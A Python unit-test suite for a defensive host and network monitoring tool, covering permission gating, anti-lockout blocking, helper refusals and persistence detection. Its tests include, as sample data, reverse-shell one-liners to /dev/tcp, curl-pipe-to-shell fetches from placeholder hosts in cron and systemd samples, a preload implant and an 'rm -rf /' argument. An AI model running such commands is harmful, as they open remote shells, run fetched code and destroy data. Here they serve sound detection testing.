"""Tests for /mode defender (gnoc_defender.py, the new gnoc_defend read checks, the root helper's refusals).

Nothing here changes the machine: actions are monkeypatched, and the helper is driven only down its refusal paths.
"""
import importlib.machinery
import importlib.util
import json
import os
import stat
import sys
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import gnoc_alerts as A  # noqa: E402
import gnoc_defend as D  # noqa: E402
import gnoc_defender as G  # noqa: E402
import gnoc_enforce as E  # noqa: E402
import gnoc_modes  # noqa: E402
import gnoc_triage as T  # noqa: E402


def _helper_module():
    loader = importlib.machinery.SourceFileLoader("gnoc_defender_helper", os.path.join(HERE, "gnoc-defender-helper"))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


class _Tmp(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self._state = G.STATE
        G.STATE = self.tmp.name

    def tearDown(self):
        G.STATE = self._state
        self.tmp.cleanup()


class PermissionAnswers(_Tmp):
    def test_model_cannot_grant_itself_auto_powers(self):
        # Auto-defense defaults are ON, so start from an explicit OFF and prove the model's own answer
        # cannot flip it without GreyNOC's yes.
        G.save_profile({"allow_block_ips": False, "exposed": {}, "admin_sources": []})
        ok, bad = G.record_answers({"allow_block_ips": True}, "what is open on this box", asked=["allow_block_ips"])
        self.assertFalse(ok)
        self.assertIn("allow_block_ips", bad[0])
        self.assertFalse(G.load_profile().get("allow_block_ips"))

    def test_yes_only_counts_for_a_question_that_was_asked(self):
        ok, bad = G.record_answers({"allow_contain": "yes"}, "yes", asked=["allow_block_ips"])
        self.assertTrue(bad)
        ok, bad = G.record_answers({"allow_contain": "yes"}, "1 yes 2 yes", asked=["allow_contain"])
        self.assertEqual(bad, [])
        self.assertTrue(G.load_profile()["allow_contain"])

    def test_turning_a_permission_off_is_always_accepted(self):
        G.save_profile({"allow_sysctl": True, "exposed": {}, "admin_sources": []})
        ok, bad = G.record_answers({"allow_sysctl": "no"}, "", asked=[])
        self.assertFalse(G.load_profile()["allow_sysctl"])

    def test_port_and_admin_answers(self):
        ok, bad = G.record_answers({"exposed.8001": "no", "admin_sources": "10.0.0.0/24, not-an-ip"},
                                   "8001 no, admin is 10.0.0.0/24")
        p = G.load_profile()
        self.assertEqual(p["exposed"]["8001"], "no")
        self.assertEqual(p["admin_sources"], ["10.0.0.0/24"])
        self.assertTrue(any("not-an-ip" in b for b in bad))


class PlanAndAntiLockout(_Tmp):
    def setUp(self):
        super().setUp()
        self._prot = G.protected_ips
        G.protected_ips = lambda profile, dest=None: {"203.0.113.50"}

    def tearDown(self):
        G.protected_ips = self._prot
        super().tearDown()

    def _f(self, ip):
        return G._f(f"brute:{ip}", "high", "logins", "x", "y", {"kind": "block_ip", "ip": ip, "ttl": 3600})

    def test_private_admin_and_live_session_ips_are_never_blocked(self):
        prof = {"exposed": {}, "admin_sources": ["198.51.100.0/24"], "allow_block_ips": True}
        rows = G.plan([self._f("10.0.0.78"), self._f("198.51.100.7"), self._f("203.0.113.50"),
                       self._f("8.8.4.4")], prof)
        verdicts = {f["act"]["ip"]: v for f, v, _ in rows}
        self.assertEqual(verdicts["10.0.0.78"], "refused")      # LAN
        self.assertEqual(verdicts["198.51.100.7"], "refused")   # inside an admin source CIDR
        self.assertEqual(verdicts["203.0.113.50"], "refused")   # a live admin session
        self.assertEqual(verdicts["8.8.4.4"], "allowed")

    def test_permission_off_means_ask(self):
        rows = G.plan([self._f("8.8.4.4")], {"exposed": {}, "admin_sources": []})
        self.assertEqual(rows[0][1], "ask")

    def test_protected_process_is_never_paused(self):
        f = G._f("proc:sshd:x", "crit", "process", "x", "", {"kind": "pause_pid", "pid": 999, "comm": "sshd"})
        self.assertEqual(G.plan([f], {"allow_contain": True, "exposed": {}, "admin_sources": []})[0][1], "refused")

    def test_findings_without_an_action_are_manual(self):
        f = G._f("fw:inactive", "high", "firewall", "no firewall", "sudo ufw enable")
        self.assertEqual(G.plan([f], {"exposed": {}, "admin_sources": []})[0][1], "manual")


class Approval(_Tmp):
    def test_reads_never_ask(self):
        self.assertFalse(G.needs_approval({}, {"action": "sweep"}))
        self.assertFalse(G.needs_approval({}, {"action": "respond"}))

    def test_apply_asks_unless_auto_and_no_hand_picked_ids(self):
        self.assertFalse(G.needs_approval({}, {"action": "respond", "apply": True}),
                         "auto-defense is the default now")
        self.assertTrue(G.needs_approval({"auto": False}, {"action": "respond", "apply": "true"}))
        self.assertFalse(G.needs_approval({"auto": True}, {"action": "respond", "apply": True}))
        self.assertTrue(G.needs_approval({"auto": True}, {"action": "respond", "apply": True, "ids": ["x"]}))
        self.assertFalse(G.needs_approval({}, {"action": "respond", "apply": "false"}))


class JournalAndWatcher(_Tmp):
    def setUp(self):
        super().setUp()
        self.ran = []
        self._exec, self._sweep, self._prot, self._ctr = G.execute, G.sweep, G.protected_ips, D._proc_counters

        def fake_exec(act, dest=None):
            self.ran.append(act)
            if act["kind"] == "block_ip":
                return True, f"blocked {act['ip']}", {"kind": "unblock_ip", "ip": act["ip"]}
            return True, "ok", None
        G.execute = fake_exec
        G.protected_ips = lambda profile, dest=None: set()
        D._proc_counters = lambda: ({}, {})
        self.findings = []
        G.sweep = lambda dest=None, light=False, profile=None, packet_secs=5: (list(self.findings), [])

    def tearDown(self):
        G.execute, G.sweep, G.protected_ips, D._proc_counters = self._exec, self._sweep, self._prot, self._ctr
        super().tearDown()

    def test_auto_watcher_applies_only_allowed_kinds_and_undo_reverts(self):
        G.save_profile({"allow_block_ips": True, "allow_sysctl": False, "exposed": {}, "admin_sources": []})
        said = []
        w = G.Watcher(say=said.append)
        w.auto = True
        self.assertEqual(w.tick(), [])   # baseline pass, nothing yet
        self.findings = [G._f("brute:8.8.4.4", "high", "logins", "30 failed", "", {"kind": "block_ip",
                                                                                 "ip": "8.8.4.4", "ttl": 3600}),
                         G._f("sysctl:x", "high", "sysctl", "weak", "", {"kind": "sysctl", "key": "k", "value": "1"})]
        out = w.tick()
        self.assertTrue(any("ALERT" in x for x in out))
        self.assertEqual([a["kind"] for a in self.ran], ["block_ip"])     # sysctl not allowed -> not run
        self.assertTrue(any("needs your yes" in x for x in out))
        self.assertEqual(w.tick(), [])   # the same finding does not alert twice
        lines = G.undo("last")
        self.assertIn("UNDONE", lines[0])
        self.assertEqual(self.ran[-1], {"kind": "unblock_ip", "ip": "8.8.4.4"})
        self.assertEqual(G.undo("last"), ["  nothing to undo"])

    def test_alert_only_watcher_never_acts(self):
        G.save_profile({"allow_block_ips": True, "exposed": {}, "admin_sources": []})
        w = G.Watcher(say=lambda x: None)
        w.auto = False
        w.tick()
        self.findings = [G._f("brute:8.8.4.4", "high", "logins", "x", "", {"kind": "block_ip", "ip": "8.8.4.4"})]
        out = w.tick()
        self.assertEqual(self.ran, [])
        self.assertTrue(any("auto-defense is off" in x for x in out))


class ReadChecks(unittest.TestCase):
    def test_tcpdump_parse_and_port_scan_detection(self):
        lines = "\n".join(f"IP 203.0.113.9.40000 > 10.0.0.50.{p}: Flags [S], seq 1, length 0" for p in range(20, 40))
        pk = D.parse_tcpdump(lines)
        self.assertEqual(len(pk), 20)
        self.assertTrue(all(p[5] for p in pk))
        txt = D.summarize_packets(pk, {"10.0.0.50"}, 5, "test")
        self.assertIn("port scan: 203.0.113.9 tried 20", txt)

    def test_tshark_fields_parse(self):
        row = "\t".join(["1.2.3.4", "", "10.0.0.50", "", "5555", "22", "", "", "1", "0", "TCP", "60"])
        self.assertEqual(D.parse_tshark(row), [("1.2.3.4", 5555, "10.0.0.50", 22, "tcp", True, 60)])

    def test_reverse_shell_and_miner_signatures(self):
        self.assertTrue(D.REVERSE_SHELL.search("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
        self.assertTrue(D.REVERSE_SHELL.search("curl -s http://x/y.sh | sh"))
        self.assertFalse(D.REVERSE_SHELL.search("/usr/bin/python3 -m http.server 8000"))
        self.assertTrue(D.MALWARE_NAMES.match("xmrig"))
        self.assertFalse(D.MALWARE_NAMES.match("xmrig-notes.txt"))

    def test_remote_target_wraps_argv_in_batchmode_ssh(self):
        seen = {}
        real = D.subprocess.Popen

        class P:
            def __init__(self, argv, **k):
                seen["argv"] = argv
                self.returncode, self.pid = 0, 1

            def communicate(self, timeout=None):
                return "ok", ""
        D.subprocess.Popen = P
        try:
            with D.on_host("alice@192.0.2.10"):
                D._run(["ss", "-H", "-tulpn"])
            self.assertEqual(seen["argv"][:2], ["ssh", "-o"])
            self.assertIn("BatchMode=yes", seen["argv"])
            self.assertEqual(seen["argv"][-1], "LC_ALL=C ss -H -tulpn")
            self.assertIsNone(D.target())   # the context does not leak
        finally:
            D.subprocess.Popen = real


class Mode(unittest.TestCase):
    def test_detects_defense_requests_only(self):
        self.assertEqual(gnoc_modes.detect("harden this server please"), "defender")
        self.assertEqual(gnoc_modes.detect("am i compromised? something is eating cpu"), "defender")
        self.assertNotEqual(gnoc_modes.detect("fix the bug in the parser"), "defender")
        self.assertIn("defender", gnoc_modes.MODES)
        self.assertNotIn("defender", gnoc_modes.HUNT_STANCE_MODES)


class Helper(unittest.TestCase):
    def setUp(self):
        self.h = _helper_module()

    def _refused(self, argv):
        with self.assertRaises(SystemExit) as cm:
            self.h.main(argv)
        self.assertNotEqual(cm.exception.code, 0)

    def test_refuses_lan_loopback_and_bad_ttl(self):
        self._refused(["block", "10.0.0.78", "3600"])
        self._refused(["block", "127.0.0.1", "3600"])
        self._refused(["block", "8.8.4.4", "10"])
        self._refused(["block", "8.8.4.4", "999999"])

    def test_refuses_unlisted_sysctl_pid1_and_unknown_verbs(self):
        self._refused(["sysctl", "kernel.modules_disabled", "1"])
        self._refused(["sysctl", "net.ipv4.ip_forward", "0"])
        self._refused(["pause", "1"])
        self._refused(["rm", "-rf", "/"])
        self._refused([])

    def test_root_owned_protect_list_covers_admin_machines_without_a_live_session(self):
        with tempfile.NamedTemporaryFile("w", suffix=".protect", delete=False) as fh:
            fh.write("10.0.0.0/24\n198.51.100.7\n")
        try:
            self.h.PROTECT_FILE = fh.name
            self._refused(["quarantine", "10.0.0.78", "600"])
            self._refused(["block", "198.51.100.7", "600"])
            self.assertTrue(self.h.protected(self.h.ipaddress.ip_address("10.0.0.200")))
            self.assertFalse(self.h.protected(self.h.ipaddress.ip_address("10.0.1.5")))
        finally:
            os.unlink(fh.name)

    def test_quarantine_rejects_a_malformed_mac_before_touching_nft(self):
        self.h.PROTECT_FILE = "/nonexistent/protect"
        self._refused(["quarantine", "10.0.0.250", "600", "aa:bb\nFAKE LOG LINE"])

    def test_isolation_keeps_the_admin_gateway_and_dns_paths(self):
        rules = self.h.isolation_script(["10.0.0.78", "10.0.0.1", "2601:db8::1"])
        self.assertIn("policy drop", rules)
        self.assertIn("ip saddr 10.0.0.78 accept", rules)
        self.assertIn("ip daddr 10.0.0.1 accept", rules)
        self.assertIn("ip6 saddr 2601:db8::1 accept", rules)
        # DNS reaches the configured resolvers BY ADDRESS (they are in the allowed list); a port-only rule let any
        # host send from port 53 into every local port, and kept a C2 channel over 53/123 alive (QAQC 2026-11-19)
        for port_only in ("udp dport 53 accept", "udp sport 53 accept", "tcp sport 53 accept", "udp dport 123 accept",
                          "udp sport 123 accept"):
            self.assertNotIn(port_only, rules)
        self.assertIn("udp sport 67 udp dport 68 accept", rules)
        self.assertIn("icmp type echo-reply accept", rules)
        # Established is not blanket-allowed: the old rule let an attacker's already-open C2 survive isolation.
        self.assertNotIn("ct state established,related accept", rules)


class QuarantinePlan(unittest.TestCase):
    def test_admin_cidr_protects_every_device_inside_it(self):
        saved = G.protected_ips
        G.protected_ips = lambda profile, dest=None: set()
        try:
            f = G._f("arp:x", "high", "lan", "x", "", {"kind": "quarantine_lan", "ip": "10.0.0.78", "ttl": 600})
            prof = {"exposed": {}, "admin_sources": ["10.0.0.0/24"], "allow_quarantine": True}
            self.assertEqual(G.plan([f], prof)[0][1], "refused")
            prof["admin_sources"] = []
            self.assertEqual(G.plan([f], prof)[0][1], "allowed")
            g = G._f("arp:y", "high", "lan", "x", "", {"kind": "quarantine_lan", "ip": "127.0.0.1", "ttl": 600})
            self.assertEqual(G.plan([g], prof)[0][1], "refused")
        finally:
            G.protected_ips = saved


class StateAndScopeHardening(_Tmp):
    def test_malformed_profile_and_baseline_are_retyped(self):
        with open(os.path.join(G.STATE, "profile-local.json"), "w") as fh:
            json.dump([], fh)
        p = G.load_profile()
        self.assertTrue(p["auto_defense"])
        self.assertEqual(p["subnets"], [])
        with open(os.path.join(G.STATE, "network-local.json"), "w") as fh:
            json.dump([], fh)
        self.assertFalse(G.load_baseline()["initialized"])

    def test_state_files_and_directory_are_private(self):
        G.save_profile(G.load_profile())
        self.assertEqual(stat.S_IMODE(os.stat(G.STATE).st_mode), 0o700)
        self.assertEqual(stat.S_IMODE(os.stat(G._path("profile", None)).st_mode), 0o600)

    def test_baseline_can_be_reset_only_on_request(self):
        G.save_baseline({"initialized": True, "neighbors": {}})
        self.assertTrue(G.load_baseline()["initialized"])
        self.assertIn("cleared", G.reset_baseline())
        self.assertFalse(G.load_baseline()["initialized"])

    def test_a_spoofed_mac_never_overwrites_the_trusted_baseline(self):
        G.save_baseline({"initialized": True,
                         "gateways": {"10.0.0.1": {"mac": "bb:bb:bb:bb:bb:bb", "first_seen": "old"}},
                         "neighbors": {"10.0.0.5": {"mac": "aa:aa:aa:aa:aa:aa", "first_seen": "old"}}})
        profile = {"gateways": ["10.0.0.1"], "subnets": ["10.0.0.0/24"],
                   "gateway_macs": {"10.0.0.1": "bb:bb:bb:bb:bb:bb"}, "dhcp_servers": []}
        snapshot = {
            "host": "h",
            "links": [{"name": "wlan0", "kind": "wlan", "mac": "00:11:22:33:44:55",
                       "addrs": [{"family": "inet", "address": "10.0.0.20", "prefixlen": 24}]}],
            "routes": [{"gateway": "10.0.0.1", "dev": "wlan0", "family": "ipv4"}],
            "neighbors": [{"ip": "10.0.0.1", "mac": "dd:dd:dd:dd:dd:dd", "dev": "wlan0"},
                          {"ip": "10.0.0.5", "mac": "cc:cc:cc:cc:cc:cc", "dev": "wlan0"}],
            "wifi": {"iface": "wlan0", "connected": True, "ssid": "Home", "bssid": "12:34:56:78:9a:bc",
                     "security": "WPA2"},
            "dns": ["10.0.0.1"], "dhcp": [], "gateway_ports": {}}
        findings, _notes = G.network_sweep(profile=profile, snapshot=snapshot, save=True)
        ids = {f["id"] for f in findings}
        self.assertIn("net:gw:10.0.0.1:mac", ids)
        self.assertIn("net:arp:10.0.0.5:mac", ids)
        baseline = G.load_baseline()
        self.assertEqual(baseline["gateways"]["10.0.0.1"]["mac"], "bb:bb:bb:bb:bb:bb")
        self.assertEqual(baseline["neighbors"]["10.0.0.5"]["mac"], "aa:aa:aa:aa:aa:aa")

    def test_a_laptop_on_another_wifi_is_not_an_intrusion(self):
        """2026-11-23: a cafe router at the home router's address (10.0.0.1) with its own MAC was a CRITICAL gateway
        change and an intrusion case, and every stranger's phone a new-device alert. Baselines are per network."""
        G.save_baseline({"initialized": True,
                         "gateways": {"10.0.0.1": {"mac": "bb:bb:bb:bb:bb:bb", "first_seen": "old"}},
                         "neighbors": {"10.0.0.5": {"mac": "aa:aa:aa:aa:aa:aa", "first_seen": "old"}},
                         "wifi": {"wlan0": {"ssid": "Home", "bssid": "12:34:56:78:9a:bc", "security": "WPA2"}}})
        profile = {"gateways": ["10.0.0.1"], "subnets": ["10.0.0.0/24"], "dhcp_servers": []}

        def snap(ssid, gw_mac, others):
            return {"host": "h", "links": [{"name": "wlan0", "kind": "wlan", "mac": "00:11:22:33:44:55",
                                            "addrs": [{"family": "inet", "address": "10.0.0.20", "prefixlen": 24}]}],
                    "routes": [{"gateway": "10.0.0.1", "dev": "wlan0", "family": "ipv4"}],
                    "neighbors": [{"ip": "10.0.0.1", "mac": gw_mac, "dev": "wlan0"}]
                    + [{"ip": ip, "mac": m, "dev": "wlan0"} for ip, m in others],
                    "wifi": {"iface": "wlan0", "connected": True, "ssid": ssid, "bssid": "aa:00:00:00:00:01",
                             "security": "WPA2"}, "dns": ["10.0.0.1"], "dhcp": [], "gateway_ports": {}}
        ids = {f["id"] for f in G.network_sweep(profile=profile, snapshot=snap(
            "Cafe", "dd:dd:dd:dd:dd:dd", [("10.0.0.9", "ee:ee:ee:ee:ee:ee")]), save=True)[0]}
        self.assertNotIn("net:gw:10.0.0.1:mac", ids)
        self.assertFalse(any(i.startswith("net:host:new:") for i in ids), ids)   # the first visit is learned
        b = G.load_baseline()
        self.assertEqual(b["gateways"]["10.0.0.1"]["mac"], "bb:bb:bb:bb:bb:bb")   # home kept
        self.assertEqual(b["gateways"]["10.0.0.1@Cafe"]["mac"], "dd:dd:dd:dd:dd:dd")
        ids = {f["id"] for f in G.network_sweep(profile=profile, snapshot=snap(
            "Cafe", "dd:dd:dd:dd:dd:dd", [("10.0.0.9", "ee:ee:ee:ee:ee:ee"), ("10.0.0.10", "ff:ff:ff:ff:ff:01")]),
            save=True)[0]}
        self.assertIn("net:host:new:10.0.0.10", ids)   # a learned network reports what is new on it
        ids = {f["id"] for f in G.network_sweep(profile=profile, snapshot=snap(
            "Home", "bb:bb:bb:bb:bb:bb", [("10.0.0.5", "aa:aa:aa:aa:aa:aa")]), save=True)[0]}
        self.assertNotIn("net:gw:10.0.0.1:mac", ids)
        ids = {f["id"] for f in G.network_sweep(profile=profile, snapshot=snap(
            "Home", "dd:dd:dd:dd:dd:dd", [("10.0.0.5", "aa:aa:aa:aa:aa:aa")]), save=True)[0]}
        self.assertIn("net:gw:10.0.0.1:mac", ids)   # at home a different router MAC is still critical

    def test_scope_validators_refuse_the_whole_internet_and_loopback(self):
        self.assertEqual(G._valid_net("0.0.0.0/0")[0], None)
        self.assertEqual(G._valid_net("127.0.0.0/8")[0], None)
        self.assertEqual(G._valid_net("224.0.0.0/4")[0], None)
        self.assertEqual(G._valid_gateway("0.0.0.0")[0], None)
        self.assertEqual(G._valid_gateway("224.0.0.1")[0], None)
        self.assertIsNotNone(G._valid_net("10.0.0.0/24")[0])
        self.assertIsNotNone(G._valid_gateway("fe80::1")[0])

    def test_an_empty_controller_config_is_not_configured(self):
        self.assertEqual(G._sanitize_api({}), {})
        self.assertEqual(G._sanitize_api({"kind": "unifi"}), {})
        self.assertEqual(E.capabilities(G.load_profile()), {})

    def test_questions_do_not_repeat_forever(self):
        asked = set()
        with mock.patch.object(G, "effective_scope", return_value={}):
            for _ in range(4):
                qs = G.questions({}, [], asked=asked)
                asked |= {k for k, _t in qs}
        self.assertEqual(qs, [])

    def test_api_answers_never_store_a_credential(self):
        ok, bad = G.record_answers({"gateway_api": {"url": "https://controller:8443", "token": "secret"}},
                                   "controller")
        self.assertEqual(ok, [])
        self.assertTrue(any("never store" in b for b in bad))
        self.assertEqual(G.load_profile()["gateway_api"], {})

    def test_api_answers_refuse_credentials_in_the_url(self):
        for url in ("https://admin:pw@controller:8443", "https://controller:8443/?api_key=pw"):
            ok, bad = G.record_answers({"gateway_api": {"url": url}}, "controller")
            self.assertEqual(ok, [])
            self.assertTrue(bad)
            self.assertEqual(G.load_profile()["gateway_api"], {})

    def test_private_controller_url_is_accepted(self):
        ok, bad = G.record_answers({"gateway_api": {"url": "https://controller:8443", "kind": "unifi"}},
                                   "controller")
        self.assertEqual(bad, [])
        self.assertEqual(G.load_profile()["gateway_api"]["url"], "https://controller:8443")


class EnforceGuards(unittest.TestCase):
    def test_blockability_rejects_unspecified_multicast_loopback_and_broadcast_mac(self):
        self.assertFalse(E._blockable_ip("0.0.0.0"))
        self.assertFalse(E._blockable_ip("224.0.0.1"))
        self.assertFalse(E._blockable_ip("127.0.0.1"))
        self.assertTrue(E._blockable_ip("10.0.0.9"))
        self.assertFalse(E.valid_mac("ff:ff:ff:ff:ff:ff"))
        self.assertFalse(E.valid_mac("01:00:5e:00:00:01"))
        self.assertTrue(E.valid_mac("aa:bb:cc:dd:ee:ff"))

    def test_ssh_destination_cannot_be_an_option(self):
        self.assertFalse(E.valid_dest("-oProxyCommand"))
        self.assertFalse(E.valid_dest("-lroot"))
        self.assertTrue(E.valid_dest("alice@10.0.0.5"))
        self.assertTrue(E.valid_dest("controller"))

    def test_malformed_actions_are_refused_before_any_backend(self):
        calls = []
        real = E._ssh
        E._ssh = lambda *a, **k: (calls.append(a) or (0, ""))
        try:
            self.assertFalse(E.run({"kind": "gateway_block_ip", "ip": "bad", "dest": "gw", "ttl": 60})[0])
            self.assertFalse(E.run({"kind": "gateway_block_mac", "mac": "bad", "dest": "gw", "ttl": 60})[0])
            self.assertEqual(E._ttl("1h"), E.DEFAULT_TTL)
            self.assertEqual(calls, [])
        finally:
            E._ssh = real

    def test_check_refuses_multicast_and_broadcast_without_touching_a_host(self):
        p = {"gateways": [], "gateway_ssh": "root@gw", "gateway_platform": "openwrt"}
        saved = E._own_or_gateway
        E._own_or_gateway = lambda *a, **k: False
        try:
            self.assertFalse(E.check({"kind": "gateway_block_ip", "ip": "0.0.0.0"}, p)[0])
            self.assertFalse(E.check({"kind": "gateway_block_mac", "mac": "ff:ff:ff:ff:ff:ff"}, p)[0])
        finally:
            E._own_or_gateway = saved

    def test_api_url_policy_is_private_by_default(self):
        self.assertFalse(E._api_url_ok("https://8.8.8.8", {}))
        self.assertTrue(E._api_url_ok("https://127.0.0.1", {}))
        self.assertTrue(E._api_url_ok("http://controller:8443", {}))
        self.assertTrue(E._api_url_ok("https://8.8.8.8", {"allow_public": True}))
        self.assertFalse(E._api_url_ok("http://169.254.169.254", {}))
        self.assertFalse(E._api_url_ok("http://metadata.google.internal", {}))
        self.assertFalse(E._api_url_ok("https://admin:secret@controller:8443", {}))
        self.assertFalse(E._api_url_ok("https://controller:8443/?api_key=secret", {}))


class AlertsAndTriageHardening(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.saved = (G.STATE, A.STATE, A.STORE, T.STATE, T.STORE)
        G.STATE = self.tmp.name
        A.STATE, A.STORE = self.tmp.name, os.path.join(self.tmp.name, "alerts.jsonl")
        T.STATE, T.STORE = self.tmp.name, os.path.join(self.tmp.name, "triage.jsonl")

    def tearDown(self):
        G.STATE, A.STATE, A.STORE, T.STATE, T.STORE = self.saved
        self.tmp.cleanup()

    def test_alert_evidence_string_is_one_item_and_private(self):
        a, _ = A.raise_alert(title="x\x1b[2J", evidence="abc")
        self.assertEqual(a["evidence"], ["abc"])
        self.assertNotIn("\x1b", a["title"])
        self.assertEqual(stat.S_IMODE(os.stat(A.STORE).st_mode), 0o600)

    def test_malformed_event_does_not_break_the_queue(self):
        with open(A.STORE, "w") as fh:
            fh.write('{"id": [], "title": "bad"}\n')
        a, _ = A.raise_alert(title="new", evidence="abc")
        self.assertTrue(a["id"].startswith("A-"))
        self.assertIn("abc", A.render_detail(a))
        self.assertNotIn("\x1b", A.render_detail(a))

    def test_suppress_tolerates_a_non_numeric_ttl(self):
        self.assertIsNone(A.suppress("nope", ttl="1h"))

    def test_closed_case_is_not_reopened_by_a_state_change(self):
        assessment = T.assess([{"id": "proc:x", "sev": "crit", "area": "process", "fact": "x"}])
        case, _ = T.open_case("host", [], assessment)
        T.update_case(case["id"], "close")
        self.assertIsNone(T.update_case(case["id"], "ack"))
        self.assertIsNotNone(T.update_case(case["id"], "note", note="recorded"))

    def test_overdue_incident_is_visible_in_the_queue(self):
        assessment = T.assess([])
        case, _ = T.open_case("host", [], assessment)
        case["sla_due"] = "2000-01-01T00:00:00"
        self.assertIn("OVERDUE", T.render_list([case]))

    def test_wifi_security_downgrade_is_an_active_signal(self):
        a = T.assess([{"id": "net:wlan:security:wlan0", "sev": "high", "area": "wlan",
                       "fact": "Wi-Fi security changed from WPA2 to open/none"}])
        self.assertTrue(a["active"])
        self.assertIn("evil-twin", a["active_signals"])

    def test_gateway_down_does_not_match_the_word_download(self):
        a = T.assess([{"id": "net:gw:1:download", "sev": "high", "area": "gateway",
                       "fact": "a download completed"}])
        self.assertFalse(any("default gateway is unreachable" in r for r in a["reasons"]))


class FindingSafety(unittest.TestCase):
    def test_findings_cannot_rewrite_the_terminal_or_forge_lines(self):
        f = G._f("id\x1b[2J\n[ALERT] forged", "crit", "process", "fact\x1b[31m\nsecond line")
        self.assertNotIn("\x1b", f["id"] + f["fact"])
        self.assertNotIn("\n", f["id"] + f["fact"])
        out = G.render([f], ["note\x1b[2J"], [], [], None, {})
        self.assertNotIn("\x1b", out)

    def test_action_strings_are_sanitized(self):
        f = G._f("x", "crit", "process", "x", "", {"kind": "pause_pid", "pid": 42, "comm": "evil\x1b[2J"})
        self.assertNotIn("\x1b", f["act"]["comm"])


class RemoteScope(unittest.TestCase):
    def test_network_sweep_runs_on_the_remote_target(self):
        seen = {}

        def fake_network(*_a, **_k):
            seen["target"] = D.target()
            return [], []

        with mock.patch.multiple(D, listening=lambda: [], containers=lambda: {}, firewall=lambda: ("active", ""),
                                 sshd_settings=lambda: ({}, False), connection_rows=lambda: [], process_rows=lambda: [],
                                 setting_rows=lambda: [], hostname=lambda: "remote",
                                 persistence_files=lambda: None, authorized_key_prints=lambda text=None: {}), \
                mock.patch.object(G, "failed_logins", return_value={}), \
                mock.patch.object(G, "accepted_logins", return_value={}), \
                mock.patch.object(G, "network_sweep", fake_network):
            G.sweep("gn@remote", light=True, profile=G.load_profile(), net=True)
        self.assertEqual(seen["target"], "gn@remote")


class Hardening20261118(unittest.TestCase):
    """Regressions for the 2026-11-18 defender review: log-injection blocking, watcher restarts, dual-stack
    quarantine, alert dedup after suppression, triage escalation, enforcement backends, helper input."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.saved = (G.STATE, A.STATE, A.STORE, T.STATE, T.STORE)
        G.STATE = self.tmp.name
        A.STATE, A.STORE = self.tmp.name, os.path.join(self.tmp.name, "alerts.jsonl")
        T.STATE, T.STORE = self.tmp.name, os.path.join(self.tmp.name, "triage.jsonl")

    def tearDown(self):
        G.STATE, A.STATE, A.STORE, T.STATE, T.STORE = self.saved
        self.tmp.cleanup()

    # --- log parsing: the username is attacker-chosen
    def test_injected_username_cannot_name_the_blocked_address(self):
        self.assertEqual(G._log_source("Invalid user from 1.1.1.1 from 203.0.113.7 port 4242"), "203.0.113.7")
        self.assertEqual(G._log_source("Failed password for invalid user 8.8.8.8 port 22 from 198.51.100.4 "
                                       "port 5555 ssh2"), "198.51.100.4")
        self.assertEqual(G._log_source("Connection closed by authenticating user root 192.0.2.9 port 22 "
                                       "[preauth]"), "192.0.2.9")
        self.assertEqual(G._log_source("pam_unix(sshd:auth): authentication failure; rhost=203.0.113.50 user=x"),
                         "203.0.113.50")
        self.assertIsNone(G._log_source("Failed password for root from host.example port 22 ssh2"))

    # --- persistence
    def test_persistence_flags_implants_and_ignores_mentions(self):
        files = {
            "/etc/ld.so.preload": "/usr/local/lib/libhide.so\n",
            "/etc/systemd/system/x.service": "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'\nExecStartPre=-\n",
            "/etc/cron.d/y": "SHELL=/bin/sh\n@reboot root curl -s http://x.example/a | sh\n*/5 * * * * root /tmp/.k/run\n",
            "/etc/init.d/z": 'fn="$(mktemp /tmp/testwriteable.XXXX)" || return 1\n',
            "/home/u/.bashrc": "alias sudo='/home/u/.s/sudo'\n",
        }
        rows = {(r[0], r[2].split(":")[0]) for r in D.persistence_rows(files)}
        self.assertIn(("crit", "preload"), rows)
        self.assertIn(("crit", "/etc/systemd/system/x.service"), rows)
        self.assertIn(("high", "/etc/cron.d/y"), rows)
        self.assertIn(("high", "/home/u/.bashrc"), rows)
        self.assertFalse([r for r in rows if r[1] == "/etc/init.d/z"])
        facts = " ".join(r[3] for r in D.persistence_rows(files))
        self.assertIn("curl -s http://x.example/a | sh", facts)   # the @reboot command, minus the user field

    def test_persist_dump_and_key_prints_tolerate_junk(self):
        self.assertEqual(D.parse_persist_dump("junk\n@@GNOC-PERSIST@@ /etc/a\nl1\n@@GNOC-PERSIST@@ rel\nx"),
                         {"/etc/a": "l1"})
        prints = D.authorized_key_prints('command="echo \\"hi" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE c\n'
                                         "ssh-rsa !!notbase64 d\n")
        self.assertEqual(len(prints), 1)
        self.assertTrue(next(iter(prints)).startswith("SHA256:"))

    def test_host_drift_records_reports_and_accepts(self):
        snap = G.host_snapshot({"/etc/ld.so.preload": "", "/etc/profile": "a"}, {"SHA256:k1": "me"},
                               [{"proto": "tcp", "port": 22, "proc": "sshd"}])
        out, notes = G.host_drift(snap)
        self.assertEqual(out, [])
        self.assertIn("host baseline recorded", notes[0])
        snap2 = G.host_snapshot({"/etc/ld.so.preload": "/tmp/x.so", "/etc/profile": "a"},
                                {"SHA256:k1": "me", "SHA256:k2": "attacker"},
                                [{"proto": "tcp", "port": 22, "proc": "sshd"},
                                 {"proto": "tcp", "port": 4444, "proc": "nc"},
                                 {"proto": "tcp", "port": 40001, "proc": "sshd"}])
        out, _ = G.host_drift(snap2)
        sev = {f["id"]: f["sev"] for f in out}
        self.assertEqual(sev["drift:file:/etc/ld.so.preload"], "crit")
        self.assertEqual(sev["drift:key:SHA256:k2"], "high")
        self.assertIn("drift:port:tcp:4444", sev)
        self.assertNotIn("drift:port:tcp:40001", sev)   # a known program on a fresh ephemeral port
        out, _ = G.host_drift(snap2)                     # drift persists until accepted
        self.assertTrue(out)
        self.assertTrue(T.assess(out)["active"])          # a changed preload is an intrusion signal

    def test_unreadable_pass_never_records_a_baseline(self):
        out, notes = G.host_drift(G.host_snapshot(None, {}, []))
        self.assertEqual(out, [])
        self.assertFalse(G.load_host_baseline()["initialized"])

